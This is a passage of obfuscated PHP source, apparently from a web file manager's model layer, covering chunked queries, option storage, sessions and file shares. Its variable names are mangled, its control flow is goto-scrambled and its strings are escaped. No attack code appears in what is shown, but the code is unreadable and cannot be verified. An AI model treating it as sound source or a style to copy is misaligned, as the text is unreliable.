is_array($FˆÊÍ±ÜŠÓ) ? $FˆÊÍ±ÜŠÓ : array(); $câöîÈ¾‡Ö = count($FˆÊÍ±ÜŠÓ); goto c„¨¡»¶ù‚; AÑÅ”¡¡ª: $B»É©Ê»ö¢ = $this->findWhereField($bªˆ¥îìõ); if (!$B»É©Ê»ö¢) { return parent::save($càƒ†¹œ©, $E ëÚ‚Š); } $bİ¬®Œ£îµ = 0; goto cÛ¯¸¡Á…Å; c„¨¡»¶ù‚: for ($EÖã­ƒÇ = 0; $EÖã­ƒÇ < $câöîÈ¾‡Ö; $EÖã­ƒÇ += $cõõèŒÓ§) { $cå‘ƒ×ŠÔŞ = array_slice($FˆÊÍ±ÜŠÓ, $EÖã­ƒÇ, $cõõèŒÓ§); if (!is_array($cå‘ƒ×ŠÔŞ) || count($cå‘ƒ×ŠÔŞ) == 0) { break; } $bªˆ¥îìõ[$B×¼âš´¹õ[259]][$B»É©Ê»ö¢][1] = $cå‘ƒ×ŠÔŞ; $this->optionsValue($bªˆ¥îìõ); $bİ¬®Œ£îµ += parent::save($càƒ†¹œ©, $E ëÚ‚Š); $this->chunkEventCheck(count($cå‘ƒ×ŠÔŞ)); } $this->chunkEventSet(); return $bİ¬®Œ£îµ; goto fğ£¸µÖ£µ; fğ£¸µÖ£µ: } public function add($F—Ê†õÔ¿¾ = '', $A®Û´İªÙ‘ = array(), $b„¯¶™ÓÒÛ = false) { if ($this->addTaskStatus && is_array($F—Ê†õÔ¿¾)) { $this->addTaskData[] = $F—Ê†õÔ¿¾; return; } return parent::add($F—Ê†õÔ¿¾, $A®Û´İªÙ‘, $b„¯¶™ÓÒÛ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($FŠ§¿•¹¼í = array()) { goto DåÄŒÌßò»; B‹×·¸ß”: return $a×šÄ÷ ; goto D ÕÕµöê‰; AôšŸÈ»¥: $dóêŒÉÙ¬¿ = $this->findWhereField($Cƒäˆ¨ƒ›É); if (!$dóêŒÉÙ¬¿ || isset($Cƒäˆ¨ƒ›É[$dç¯îƒ©«[276]]) || isset($Cƒäˆ¨ƒ›É[$dç¯îƒ©«[336]])) { return parent::select($FŠ§¿•¹¼í); } $DÆ²ÅºÇæß = $Cƒäˆ¨ƒ›É[$dç¯îƒ©«[259]][$dóêŒÉÙ¬¿][1]; goto B”ä×±Õ¡Õ; DåÄŒÌßò»: $dç¯îƒ©« =& $_SERVER[Ö]; $D…”åã”£ = self::SQL_WHERE_IN_CHUNK; $Cƒäˆ¨ƒ›É = $this->optionsValue(); goto AôšŸÈ»¥; B”ä×±Õ¡Õ: $DÆ²ÅºÇæß = is_array($DÆ²ÅºÇæß) ? $DÆ²ÅºÇæß : array(); $a×šÄ÷  = null; for ($C®›ó¢ç¡¼ = 0; $C®›ó¢ç¡¼ < count($DÆ²ÅºÇæß); $C®›ó¢ç¡¼ += $D…”åã”£) { $e›£é×±Ø = array_slice($DÆ²ÅºÇæß, $C®›ó¢ç¡¼, $D…”åã”£); if (!is_array($e›£é×±Ø) || count($e›£é×±Ø) == 0) { break; } $Cƒäˆ¨ƒ›É[$dç¯îƒ©«[259]][$dóêŒÉÙ¬¿][1] = $e›£é×±Ø; $this->optionsValue($Cƒäˆ¨ƒ›É); $EÅÊŠ–§Ô‘ = parent::select($FŠ§¿•¹¼í); if (!$EÅÊŠ–§Ô‘) { continue; } if (is_null($a×šÄ÷ )) { $a×šÄ÷  = array(); } $a×šÄ÷  = array_merge($a×šÄ÷ , $EÅÊŠ–§Ô‘); } goto B‹×·¸ß”; D ÕÕµöê‰: } public function delete($f»à©«ÒôĞ = array()) { goto BÉ¡Üğ´­; Eê¬éäŞÙ: $E¦’ªÒÁÎ± = $this->findWhereField($bÊ’º´±êé); if (!$E¦’ªÒÁÎ±) { return parent::delete($f»à©«ÒôĞ); } $aˆÔÖÁ‹¦– = 0; goto Föôå‰½Æ; E¦³ÄãçÛ: return $aˆÔÖÁ‹¦–; goto d—àÃ¿´Œñ; Föôå‰½Æ: $b­«„Şå«² = $bÊ’º´±êé[$d›Î÷È¤®[259]][$E¦’ªÒÁÎ±][1]; $b­«„Şå«² = is_array($b­«„Şå«²) ? $b­«„Şå«² : array(); for ($dÄšñˆĞ¤ø = 0; $dÄšñˆĞ¤ø < count($b­«„Şå«²); $dÄšñˆĞ¤ø += $C°¡²ø¬ÂÕ) { $fŠãÔÎ“¶ = array_slice($b­«„Şå«², $dÄšñˆĞ¤ø, $C°¡²ø¬ÂÕ); if (!is_array($fŠãÔÎ“¶) || count($fŠãÔÎ“¶) == 0) { break; } $bÊ’º´±êé[$d›Î÷È¤®[259]][$E¦’ªÒÁÎ±][1] = $fŠãÔÎ“¶; $this->optionsValue($bÊ’º´±êé); $aˆÔÖÁ‹¦– += parent::delete($f»à©«ÒôĞ); } goto E¦³ÄãçÛ; BÉ¡Üğ´­: $d›Î÷È¤® =& $_SERVER[Ö]; $C°¡²ø¬ÂÕ = self::SQL_WHERE_IN_CHUNK; $bÊ’º´±êé = $this->optionsValue(); goto Eê¬éäŞÙ; d—àÃ¿´Œñ: } private function findWhereField($e¹ÑÈ°çƒÁ) { $DÚ§ŠøÉîî =& $_SERVER[Ö]; $a™ÁºÜÊ = self::SQL_WHERE_IN_CHUNK; if (!is_array($e¹ÑÈ°çƒÁ) || !is_array($e¹ÑÈ°çƒÁ[$DÚ§ŠøÉîî[259]])) { return !1; } foreach ($e¹ÑÈ°çƒÁ[$DÚ§ŠøÉîî[259]] as $f‘ÛÑè î· => $bÜ¼ñÏæŠ¼) { if (is_array($bÜ¼ñÏæŠ¼) && isset($bÜ¼ñÏæŠ¼[0]) && is_string($bÜ¼ñÏæŠ¼[0]) && strtolower($bÜ¼ñÏæŠ¼[0]) == $DÚ§ŠøÉîî[7] && is_array($bÜ¼ñÏæŠ¼[1]) && count($bÜ¼ñÏæŠ¼[1]) > $a™ÁºÜÊ) { ignore_timeout(); return $f‘ÛÑè î·; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\x6d\x4f\160\x74\151\157\x6e"; public $field = array(); public function listData($E„ËíÛ“¹À = false, $C¬ƒĞ›íÆ = "\x6d\157\144\151\146\171\124\x69\x6d\x65", $fŞ÷„Á‘“™ = false) { $F¢‘ëÖíÕè = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$F¢‘ëÖíÕè) { return $E„ËíÛ“¹À ? null : array(); } if (!$E„ËíÛ“¹À) { $F¢‘ëÖíÕè = array_filter(array_values($F¢‘ëÖíÕè)); return array_sort_by($F¢‘ëÖíÕè, $C¬ƒĞ›íÆ, $fŞ÷„Á‘“™); } return $F¢‘ëÖíÕè[$_SERVER[Ö][360] . $E„ËíÛ“¹À]; } public function insert($D†âñÓÅç¸) { goto DéÇ‰Ô†¡ğ; DéÇ‰Ô†¡ğ: $b¶œŞ‘…¿ö =& $_SERVER[Ö]; $D†âñÓÅç¸ = array_field_key($D†âñÓÅç¸, $this->field); $Fš¹çÔ­¸ = Model($this->modelType)->get($b¶œŞ‘…¿ö[361], $this->optionType . $b¶œŞ‘…¿ö[362]); goto F§—èƒº‘Á; EÅÃÑ‹ç×: $D†âñÓÅç¸[$b¶œŞ‘…¿ö[106]] = time(); Model($this->modelType)->set($b¶œŞ‘…¿ö[361], $Fš¹çÔ­¸, $this->optionType . $b¶œŞ‘…¿ö[362]); Model($this->modelType)->set($b¶œŞ‘…¿ö[360] . $Fš¹çÔ­¸, $D†âñÓÅç¸, $this->optionType); goto FÆ‘ƒÒö; F§—èƒº‘Á: $Fš¹çÔ­¸ = $Fš¹çÔ­¸ ? $Fš¹çÔ­¸ : 0; $D†âñÓÅç¸[$b¶œŞ‘…¿ö[363]] = ++$Fš¹çÔ­¸; $D†âñÓÅç¸[$b¶œŞ‘…¿ö[183]] = time(); goto EÅÃÑ‹ç×; FÆ‘ƒÒö: return $Fš¹çÔ­¸; goto b ŠöÕå¯ñ; b ŠöÕå¯ñ: } public function update($fæ¸…è±Ö¹, $D“Ä¬¦Š‚·) { goto bÆè§Ñæ•‘; dùÚ®ï¬õ‘: return Model($this->modelType)->set($ağî„òïº¿[360] . $fæ¸…è±Ö¹, $D“Ä¬¦Š‚·, $this->optionType); goto aˆô·³œß; AÄä›­ Í: if (!$EÉó´½Ä‚ù) { return !1; } $D“Ä¬¦Š‚· = array_merge($EÉó´½Ä‚ù, $D“Ä¬¦Š‚·); $D“Ä¬¦Š‚·[$ağî„òïº¿[106]] = time(); goto dùÚ®ï¬õ‘; bÆè§Ñæ•‘: $ağî„òïº¿ =& $_SERVER[Ö]; $D“Ä¬¦Š‚· = array_field_key($D“Ä¬¦Š‚·, $this->field); $EÉó´½Ä‚ù = $this->listData($fæ¸…è±Ö¹); goto AÄä›­ Í; aˆô·³œß: } public function remove($c‘Ë‚×íÅ) { return Model($this->modelType)->remove($_SERVER[Ö][360] . $c‘Ë‚×íÅ, $this->optionType); } public function clear() { $eÊ‘˜»¾ÑÁ =& $_SERVER[Ö]; Model($this->modelType)->remove($eÊ‘˜»¾ÑÁ[361], $this->optionType . $eÊ‘˜»¾ÑÁ[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($cƒôõé·™, $f‹øÕ¶¿œ—) { if (!$f‹øÕ¶¿œ—) { return !1; } $A†ÂñÒùœ = $this->listData(); $A†ÂñÒùœ = array_to_keyvalue($A†ÂñÒùœ, $cƒôõé·™); return isset($A†ÂñÒùœ[$f‹øÕ¶¿œ—]) ? $A†ÂñÒùœ[$f‹øÕ¶¿œ—] : !1; } public function findByName($c›ö†¨ é½) { return $this->findByKey($_SERVER[Ö][28], $c›ö†¨ é½); } protected function resetData($eßø‹ºâÉ¸) { $fÏ¯Â¼öÀ =& $_SERVER[Ö]; $eßø‹ºâÉ¸ = is_array($eßø‹ºâÉ¸) ? $eßø‹ºâÉ¸ : array(); $b‹çÙ–à›­ = array(); for ($CĞ¡”‹„Ş‘ = 0; $CĞ¡”‹„Ş‘ < count($eßø‹ºâÉ¸); $CĞ¡”‹„Ş‘++) { $b‹çÙ–à›­[$fÏ¯Â¼öÀ[360] . $eßø‹ºâÉ¸[$CĞ¡”‹„Ş‘][$fÏ¯Â¼öÀ[363]]] = $eßø‹ºâÉ¸[$CĞ¡”‹„Ş‘]; } return Model($this->modelType)->set($b‹çÙ–à›­, !1, $this->optionType); } private function getAutoName($dŒ³ÛÔ×²) { $añäñå‘ = array_to_keyvalue($this->listData(), $_SERVER[Ö][28]); if (!$añäñå‘ || !isset($añäñå‘[$dŒ³ÛÔ×²])) { return $dŒ³ÛÔ×²; } for ($Fî¼ÆÉñº¦ = 1; $Fî¼ÆÉñº¦ < count($añäñå‘); $Fî¼ÆÉñº¦++) { $aŒ‚£Ï•« = $dŒ³ÛÔ×² . "\50{$Fî¼ÆÉñº¦}\x29"; if (!isset($añäñå‘[$aŒ‚£Ï•«])) { return $aŒ‚£Ï•«; } } return $aŒ‚£Ï•«; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($b¹ßÒ‚Ï¶Œ = false, $dĞÒš¤‡½ = '', $Fà¢°õ³Ø = false) { goto CŒ††‹Ó; f™Ôòôî¥: $C²¬Ï…˜¿Ø = $this->where($Eî½¯ß’Ü)->select(); $C²¬Ï…˜¿Ø = array_to_keyvalue($C²¬Ï…˜¿Ø, $C¼Ş½šƒ½[89], $C¼Ş½šƒ½[355]); foreach ($C²¬Ï…˜¿Ø as $eÇ¸î™§®Á => $FÊÒÂ’¥’) { if ($Fà¢°õ³Ø || in_array($eÇ¸î™§®Á, $this->jsonField)) { $C²¬Ï…˜¿Ø[$eÇ¸î™§®Á] = json_decode($FÊÒÂ’¥’, !0); } } goto F÷‡ôä¸·ë; b¸î‘¦¾Ç™: $Fš÷„„À«¬ = is_array($Fš÷„„À«¬) ? $Fš÷„„À«¬ : array(); if (is_array($C²¬Ï…˜¿Ø)) { $C²¬Ï…˜¿Ø = array_merge($Fš÷„„À«¬, $C²¬Ï…˜¿Ø); return $b¹ßÒ‚Ï¶Œ ? isset($C²¬Ï…˜¿Ø[$b¹ßÒ‚Ï¶Œ]) ? $C²¬Ï…˜¿Ø[$b¹ßÒ‚Ï¶Œ] : null : $C²¬Ï…˜¿Ø; } $Eî½¯ß’Ü = $this->filterWhere(array($C¼Ş½šƒ½[29] => $dĞÒš¤‡½)); goto f™Ôòôî¥; F÷‡ôä¸·ë: $this->cacheSet($dĞÒš¤‡½, $C²¬Ï…˜¿Ø); $C²¬Ï…˜¿Ø = array_merge($Fš÷„„À«¬, $C²¬Ï…˜¿Ø); return $b¹ßÒ‚Ï¶Œ ? $C²¬Ï…˜¿Ø[$b¹ßÒ‚Ï¶Œ] : $C²¬Ï…˜¿Ø; goto BÏ¸¶³‚Ù; CŒ††‹Ó: $C¼Ş½šƒ½ =& $_SERVER[Ö]; $C²¬Ï…˜¿Ø = $this->cacheGet($dĞÒš¤‡½); $Fš÷„„À«¬ = $this->optionDefault($dĞÒš¤‡½); goto b¸î‘¦¾Ç™; BÏ¸¶³‚Ù: } public function set($B†ä†œÄ, $FÌÁÀà¡» = false, $Bšß„‹ÈÒ× = '') { goto eå—¢ªç‹¡; dÅ‘÷¥‘›Û: return $this->addAll($bÈŸ˜ĞÊğÛ, array(), !0); goto AæÖ÷ƒ£ÇÕ; eå—¢ªç‹¡: $FŞÙÙ”ªö¶ =& $_SERVER[Ö]; $this->cacheRemove($Bšß„‹ÈÒ×); $bÈŸ˜ĞÊğÛ = array(); goto CÜ¦ã®ªğ¿; CÜ¦ã®ªğ¿: $cÈØÎÓÛÍ– = is_array($B†ä†œÄ) ? $B†ä†œÄ : array($B†ä†œÄ => $FÌÁÀà¡»); foreach ($cÈØÎÓÛÍ– as $bö÷ĞŠ¼ï => $B‹–Í¹—) { if (is_array($B‹–Í¹—)) { $B‹–Í¹— = json_encode_force($B‹–Í¹—); } $this->checkLength($B‹–Í¹—, !1, $this->tableName . $FŞÙÙ”ªö¶[4] . $B†ä†œÄ); $B‹–Í¹— = self::textEncode($B‹–Í¹—); $cÈØÎÓÛÍ– = array($FŞÙÙ”ªö¶[29] => $Bšß„‹ÈÒ×, $FŞÙÙ”ªö¶[89] => $bö÷ĞŠ¼ï, $FŞÙÙ”ªö¶[355] => $B‹–Í¹—); $bÈŸ˜ĞÊğÛ[] = $this->filterWhere($cÈØÎÓÛÍ–); } if (!$bÈŸ˜ĞÊğÛ) { return !0; } goto dÅ‘÷¥‘›Û; AæÖ÷ƒ£ÇÕ: } protected function optionDefault($FÏ„ª˜§Ÿ© = '') { return !1; } public function setDeep($cˆ…ÛÜ§Ä§, $EÓ¸×µæì = false, $EÁ…•ññ = '') { $d˜àììßëİ = explode($_SERVER[Ö][91], $cˆ…ÛÜ§Ä§); $E°Ãºò¬ñï = $this->get(); array_set_value($E°Ãºò¬ñï, $cˆ…ÛÜ§Ä§, $EÓ¸×µæì); $this->set($d˜àììßëİ[0], $E°Ãºò¬ñï[$d˜àììßëİ[0]], $EÁ…•ññ); } public function remove($A‘Óˆ÷“Œƒ, $Aƒ¢ç¼¡„½ = '') { $CÊ§ˆ×°¶Â =& $_SERVER[Ö]; $this->cacheRemove($Aƒ¢ç¼¡„½); $d„óää‰Šì = $this->filterWhere(array($CÊ§ˆ×°¶Â[89] => $A‘Óˆ÷“Œƒ, $CÊ§ˆ×°¶Â[29] => $Aƒ¢ç¼¡„½)); if (is_null($A‘Óˆ÷“Œƒ)) { unset($d„óää‰Šì[$CÊ§ˆ×°¶Â[89]]); } return $this->where($d„óää‰Šì)->delete(); } public function cacheSet($c¹µ¨±¾Ï, $b‡”Õ¤¡ = false) { return Cache::set($this->cacheKey($c¹µ¨±¾Ï), $b‡”Õ¤¡); } public function cacheGet($c¸‰®Èà¹) { return Cache::get($this->cacheKey($c¸‰®Èà¹)); } public function cacheRemove($e¹ ººŠÚÈ) { return Cache::remove($this->cacheKey($e¹ ººŠÚÈ)); } protected function filterWhere($F‰¨§Óè¤) { return $F‰¨§Óè¤; } protected function cacheKey($eóÒíÇ‘’Æ) { return $eóÒíÇ‘’Æ; } } goto FÄóÓ‹ŞØÇ; dÆŞµ«°½¹: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\x73\145\163\x73\x69\157\x6e"; public function get($AÂ¡Ò÷Èöå) { $FĞª®Ÿ¯È =& $_SERVER[Ö]; $EÖ§Ëß“¾ = $this->where(array($FĞª®Ÿ¯È[2178] => $AÂ¡Ò÷Èöå))->find(); if (!is_array($EÖ§Ëß“¾)) { return !1; } return $EÖ§Ëß“¾[$FĞª®Ÿ¯È[685]]; } public function set($cí—–Ïè–ø, $d©«ô“Ë›¦, $f‹©¾¤Š = 3600) { $dµï¨¶ã =& $_SERVER[Ö]; $CÉÚ´¢†ÛŞ = array($dµï¨¶ã[2178] => $cí—–Ïè–ø, $dµï¨¶ã[2107] => $d©«ô“Ë›¦, $dµï¨¶ã[2179] => $f‹©¾¤Š + time()); if (Session::get($dµï¨¶ã[2180])) { $CÉÚ´¢†ÛŞ[$dµï¨¶ã[1414]] = Session::get($dµï¨¶ã[2180]); } else { $CÉÚ´¢†ÛŞ[$dµï¨¶ã[1414]] = 0; } if ($this->get($cí—–Ïè–ø)) { return $this->where(array($dµï¨¶ã[2178] => $cí—–Ïè–ø))->save($CÉÚ´¢†ÛŞ); } else { return $this->add($CÉÚ´¢†ÛŞ, array(), !0); } } public function remove($f„Ú™î†İõ) { return $this->where(array($_SERVER[Ö][2178] => $f„Ú™î†İõ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ö][2181] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\x69\155\145", "\164\151\155\145", "\151\156\x73\145\x72\164\x2c\165\160\144\x61\164\x65", "\146\x75\156\x63\x74\x69\157\x6e"), array("\x63\162\145\x61\164\145\124\x69\x6d\145", "\x74\x69\155\145", "\x69\156\163\x65\162\x74", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\157\x70\164\x69\157\156\x73", '', "\x69\156\163\145\x72\164\54\165\x70\144\x61\164\x65\x2c\163\x65\x6c\145\143\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($cÑêŒ­ï‰) { $EİÖ¼Õ³ =& $_SERVER[Ö]; $bããëëÕÎª = isset($cÑêŒ­ï‰[0]) ? $cÑêŒ­ï‰[0] : !1; return array($EİÖ¼Õ³[2182] => array(USER_ID, $EİÖ¼Õ³[2183]), $EİÖ¼Õ³[2145] => array($bããëëÕÎª, $EİÖ¼Õ³[2184])); } protected function listSimple() { $a Ì¹ÔÒ½İ = array($_SERVER[Ö][1414] => USER_ID); $Fç÷„Âò¤ó = $this->field($this->fieldList)->where($a Ì¹ÔÒ½İ)->select(); return $Fç÷„Âò¤ó ? $Fç÷„Âò¤ó : array(); } protected function getInfo($cŒÎ‘ù°¹ø, $DÕŠ®øí§¬ = false) { $dÍ¦íÁ‹¤Ñ =& $_SERVER[Ö]; if ($DÕŠ®øí§¬) { return $this->_getShareInfo(array($dÍ¦íÁ‹¤Ñ[437] => $cŒÎ‘ù°¹ø)); } $EÁİöòåÆ = $this->cacheFunctionGet($dÍ¦íÁ‹¤Ñ[2185], $cŒÎ‘ù°¹ø); return $EÁİöòåÆ; } public function getInfoByHash($a„›óà‹«Œ) { return $this->_getShareInfo(array($_SERVER[Ö][439] => $a„›óà‹«Œ)); } public function getInfoByPath($DÓÇ‡İ¾îŠ) { $cñíªîÊï =& $_SERVER[Ö]; $d„²àºì‡° = array($cñíªîÊï[1414] => USER_ID, $cñíªîÊï[365] => $DÓÇ‡İ¾îŠ); return $this->_getShareInfo($d„²àºì‡°); } public function getInfoBySourcePath($fï’à‹öŞ¬) { $AÂÇĞÀï×á =& $_SERVER[Ö]; $fçØÄŞ“¢Ø = array($AÂÇĞÀï×á[1414] => USER_ID, $AÂÇĞÀï×á[1011] => $fï’à‹öŞ¬); return $this->_getShareInfo($fçØÄŞ“¢Ø); } private function _getShareInfo($b ”³„ÃÅ) { goto cËä“Ùòê±; CÙ¡—ƒ•›: if ($Açó‚øÄãá[$b¾·“”Ô¾°[365]] == $b¾·“”Ô¾°[464]) { $Açó‚øÄãá[$b¾·“”Ô¾°[387]] = IO::info($Açó‚øÄãá[$b¾·“”Ô¾°[1011]]); } else { $Açó‚øÄãá[$b¾·“”Ô¾°[387]] = Model($b¾·“”Ô¾°[1103])->pathInfo($Açó‚øÄãá[$b¾·“”Ô¾°[365]]); } $Açó‚øÄãá[$b¾·“”Ô¾°[2187]] = $C¼¯Ù‚œ‚ƒ; return $Açó‚øÄãá; goto f±õìŠ‰¯ê; f½§µ‡½…¥: $b ”³„ÃÅ = array($b¾·“”Ô¾°[437] => $Açó‚øÄãá[$b¾·“”Ô¾°[437]]); $fË¯áÚØò‰ = $b¾·“”Ô¾°[2186]; $C¼¯Ù‚œ‚ƒ = Model($b¾·“”Ô¾°[533])->order($b¾·“”Ô¾°[363])->field($fË¯áÚØò‰)->where($b ”³„ÃÅ)->select(); goto CÙ¡—ƒ•›; cËä“Ùòê±: $b¾·“”Ô¾° =& $_SERVER[Ö]; $Açó‚øÄãá = $this->where($b ”³„ÃÅ)->find(); if (!$Açó‚øÄãá) { return !1; } goto f½§µ‡½…¥; f±õìŠ‰¯ê: } protected function getInfoAuth($F–‘ï÷ Â) { $CñØÅ¡õÃä =& $_SERVER[Ö]; $Aƒ¥ë¡Äù = $this->getInfo($F–‘ï÷ Â); $Aƒ¥ë¡Äù[$CñØÅ¡õÃä[372]] = Model($CñØÅ¡õÃä[450])->authMake($Aƒ¥ë¡Äù[$CñØÅ¡õÃä[2187]]); return $Aƒ¥ë¡Äù; } protected function listData($fëò •¹•ñ = null, $bŠ´®‡‡÷¬ = 300) { $bé¡‹ƒ¤¥‚ =& $_SERVER[Ö]; $FÂ ¬ªìÚ = array(array($bé¡‹ƒ¤¥‚[442] => array($bé¡‹ƒ¤¥‚[921], 0), $bé¡‹ƒ¤¥‚[444] => array($bé¡‹ƒ¤¥‚[921], 0), $bé¡‹ƒ¤¥‚[2188] => $bé¡‹ƒ¤¥‚[2157])); if ($fëò •¹•ñ == $bé¡‹ƒ¤¥‚[1844]) { $FÂ ¬ªìÚ = array($bé¡‹ƒ¤¥‚[442] => 1); } else { if ($fëò •¹•ñ == $bé¡‹ƒ¤¥‚[1000]) { $FÂ ¬ªìÚ = array($bé¡‹ƒ¤¥‚[444] => 1); } } $FÂ ¬ªìÚ[$bé¡‹ƒ¤¥‚[1414]] = USER_ID; $aŠ¼Òî…Ü¾ = $this->where($FÂ ¬ªìÚ)->selectPage($bŠ´®‡‡÷¬); return $aŠ¼Òî…Ü¾; } protected function listToMe($eÕóÛ÷ÛÑ¼ = 300) { goto d˜ŠÎÄª»š; aŸ£ßöÑÖÖ: $bÁ©ÅçŸÑÕ = array($CíÁÅ†¿„Ï[517] => SourceModel::TYPE_USER, $CíÁÅ†¿„Ï[452] => USER_ID); if ($A×…Ò¯¡«») { $bÁ©ÅçŸÑÕ = array(array($CíÁÅ†¿„Ï[517] => SourceModel::TYPE_USER, $CíÁÅ†¿„Ï[452] => USER_ID), array($CíÁÅ†¿„Ï[517] => SourceModel::TYPE_GROUP, $CíÁÅ†¿„Ï[452] => array($CíÁÅ†¿„Ï[7], $A×…Ò¯¡«»)), $CíÁÅ†¿„Ï[2188] => $CíÁÅ†¿„Ï[2157]); } $BöëòÊ™â– = Model($CíÁÅ†¿„Ï[533])->where($bÁ©ÅçŸÑÕ)->selectPage($eÕóÛ÷ÛÑ¼); goto a¬™„«Æ³ì; EæªÒÂŒ÷: $c“‹´¯‡…ó = array($CíÁÅ†¿„Ï[2191] => $C¶Á†ãäç, $CíÁÅ†¿„Ï[2192] => $BöëòÊ™â–[$CíÁÅ†¿„Ï[347]]); return $c“‹´¯‡…ó; goto fÍ£¶¸¹½‚; d˜ŠÎÄª»š: $CíÁÅ†¿„Ï =& $_SERVER[Ö]; $cƒ°ƒğ¨Î = Session::get($CíÁÅ†¿„Ï[2189]); $A×…Ò¯¡«» = array_to_keyvalue($cƒ°ƒğ¨Î, $CíÁÅ†¿„Ï[33], $CíÁÅ†¿„Ï[2077]); goto aŸ£ßöÑÖÖ; D¹ÉÏ¡ïË: $bÁ©ÅçŸÑÕ = array($CíÁÅ†¿„Ï[437] => array($CíÁÅ†¿„Ï[380], array_keys($aÖ‘œ¢•…))); $C¶Á†ãäç = $this->field($CêßõÎùˆ)->where($bÁ©ÅçŸÑÕ)->select(); foreach ($C¶Á†ãäç as $B“ÅŸ‰Ó” => &$eÎùŸÚ„Ş¯) { $eÎùŸÚ„Ş¯[$CíÁÅ†¿„Ï[2187]] = $aÖ‘œ¢•…[$eÎùŸÚ„Ş¯[$CíÁÅ†¿„Ï[437]]]; } goto EæªÒÂŒ÷; a¬™„«Æ³ì: $aÖ‘œ¢•… = array_to_keyvalue_group($BöëòÊ™â–[$CíÁÅ†¿„Ï[350]], $CíÁÅ†¿„Ï[437]); if (!$aÖ‘œ¢•…) { return $BöëòÊ™â–; } $CêßõÎùˆ = $CíÁÅ†¿„Ï[2190]; goto D¹ÉÏ¡ïË; fÍ£¶¸¹½‚: } protected function shareAdd($déÉÙ×„ëÖ, $F¡ÜŠºöµ—) { $CòŠ£¹„Ãì =& $_SERVER[Ö]; $dÅ¥¶È›âš = $this->_addShareData($déÉÙ×„ëÖ, $F¡ÜŠºöµ—); if (!empty($F¡ÜŠºöµ—[$CòŠ£¹„Ãì[2193]])) { $this->_shareAuthSet($dÅ¥¶È›âš, $F¡ÜŠºöµ—[$CòŠ£¹„Ãì[2193]]); } $this->shareEventAdd($déÉÙ×„ëÖ, $F¡ÜŠºöµ—, $CòŠ£¹„Ãì[1003]); return $dÅ¥¶È›âš; } private function shareEventAdd($CÉ¬Ğá˜³ñ, $F¬ Ë‚›ÔÒ, $c²ôÇŞ‹á = "\x61\144\x64") { goto f¹ ÷ëÛŞÕ; cÖÉ‚¿¡ç: if ($d·åÙ£Ô©[$d‡Ÿ‘¾¨§[444]] == $d‡Ÿ‘¾¨§[464] && $F¬ Ë‚›ÔÒ[$d‡Ÿ‘¾¨§[444]] == $d‡Ÿ‘¾¨§[83]) { $e„‘ˆÒ«ÖÜ = $d‡Ÿ‘¾¨§[2195]; } if ($d·åÙ£Ô©[$d‡Ÿ‘¾¨§[444]] == $d‡Ÿ‘¾¨§[83] && $F¬ Ë‚›ÔÒ[$d‡Ÿ‘¾¨§[444]] == $d‡Ÿ‘¾¨§[464]) { $e„‘ˆÒ«ÖÜ = $d‡Ÿ‘¾¨§[2198]; } Model($d‡Ÿ‘¾¨§[501])->eventShare($CÉ¬Ğá˜³ñ, $e„‘ˆÒ«ÖÜ); goto c·ÎÑ˜ŠÀ»; c·ÎÑ˜ŠÀ»: return; goto Cˆ…‘‚Œñ¤; AæÅİøÒÕí: $e„‘ˆÒ«ÖÜ = $d‡Ÿ‘¾¨§[2196]; if ($d·åÙ£Ô©[$d‡Ÿ‘¾¨§[442]] == $d‡Ÿ‘¾¨§[464] && $F¬ Ë‚›ÔÒ[$d‡Ÿ‘¾¨§[442]] == $d‡Ÿ‘¾¨§[83]) { $e„‘ˆÒ«ÖÜ = $d‡Ÿ‘¾¨§[2194]; } if ($d·åÙ£Ô©[$d‡Ÿ‘¾¨§[442]] == $d‡Ÿ‘¾¨§[83] && $F¬ Ë‚›ÔÒ[$d‡Ÿ‘¾¨§[442]] == $d‡Ÿ‘¾¨§[464]) { $e„‘ˆÒ«ÖÜ = $d‡Ÿ‘¾¨§[2197]; } goto cÖÉ‚¿¡ç; f¹ ÷ëÛŞÕ: $d‡Ÿ‘¾¨§ =& $_SERVER[Ö]; if ($c²ôÇŞ‹á == $d‡Ÿ‘¾¨§[1003]) { if ($F¬ Ë‚›ÔÒ[$d‡Ÿ‘¾¨§[442]] == $d‡Ÿ‘¾¨§[83]) { Model($d‡Ÿ‘¾¨§[501])->eventShare($CÉ¬Ğá˜³ñ, $d‡Ÿ‘¾¨§[2194]); } if ($F¬ Ë‚›ÔÒ[$d‡Ÿ‘¾¨§[444]] == $d‡Ÿ‘¾¨§[83]) { Model($d‡Ÿ‘¾¨§[501])->eventShare($CÉ¬Ğá˜³ñ, $d‡Ÿ‘¾¨§[2195]); } return; } $d·åÙ£Ô© = $this->getInfoByPath($CÉ¬Ğá˜³ñ); goto AæÅİøÒÕí; Cˆ…‘‚Œñ¤: } private function _addShareData($bÎœ—ªÌ¤‚, $E²œöĞ‹Ê­ = array()) { goto A‡Á¯ÑÊ°„; D„Áï÷ïÖ: $cêÇÃÒŞ†µ = $this->add($Bˆ¸Ì”Œ‰); $AŞë×±ËÑ = array($a‡âÂ¤¡‚ƒ[439] => short_id($cêÇÃÒŞ†µ)); $this->where(array($a‡âÂ¤¡‚ƒ[436] => $cêÇÃÒŞ†µ))->save($AŞë×±ËÑ); goto C¾õ–éÏ¤ï; A‡Á¯ÑÊ°„: $a‡âÂ¤¡‚ƒ =& $_SERVER[Ö]; $A»»„÷¹Ä = array($a‡âÂ¤¡‚ƒ[379] => $bÎœ—ªÌ¤‚, $a‡âÂ¤¡‚ƒ[1405] => USER_ID); if ($bÎœ—ªÌ¤‚ == 0) { $A»»„÷¹Ä = array($a‡âÂ¤¡‚ƒ[2199] => 